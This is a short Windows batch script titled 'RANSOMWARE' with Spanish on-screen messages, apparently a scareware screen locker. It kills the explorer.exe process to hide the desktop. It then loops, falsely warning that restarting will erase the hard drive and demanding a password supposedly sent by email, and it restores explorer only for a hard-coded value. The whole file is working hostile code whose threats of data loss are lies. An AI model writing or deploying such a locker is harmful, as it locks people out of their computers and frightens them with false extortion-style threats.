@echo off 
title RANSOMWARE
taskkill /f /im explorer.exe 
:bucle 
cls    
echo =============================================           
echo            LEE CON ATENCION!.
echo =============================================
echo  - No reiniciar la computadora!.
echo  - Al reiniciar se eliminara los datos del disco duro!.
echo  - Si usted cierra esta ventana no podra recuperar su computadora!.
echo =============================================
echo  - Ingresar el password que recibio por correo.
echo =============================================
set /p pass= Escriba aqui el password: 
if %pass%==cf83e1357eefb8bdf1542850d66d8007 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades! El password es correcto.
start explorer.exe
pause
exit